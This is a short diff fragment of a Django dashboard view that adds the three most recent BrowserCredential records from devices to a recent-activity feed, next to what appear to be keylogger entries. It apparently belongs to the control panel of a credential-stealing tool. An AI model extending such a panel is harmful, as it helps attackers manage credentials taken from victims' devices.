@@ -61,6 +61,7 @@ def dashboard(request):
             'time': kl.received_at,
         })
         
+    for cr in BrowserCredential.objects.select_related('device').order_by('-received_at')[:3]:
         recent_activity.append({
             'type': 'credential',
             'icon': 'lock',
